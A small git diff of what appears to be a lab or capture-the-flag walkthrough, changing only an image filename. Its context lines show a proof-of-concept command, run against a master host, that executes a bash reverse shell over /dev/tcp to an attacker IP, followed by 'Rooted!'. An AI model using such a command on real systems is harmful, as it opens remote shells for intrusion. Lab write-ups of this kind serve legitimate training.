@@ -86,6 +86,6 @@ $ python3 poc.py --master 192.168.219.62 --exec 'bash -i >& /dev/tcp/192.168.45.
 [+] Successfully scheduled job: 20230705031527947368
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
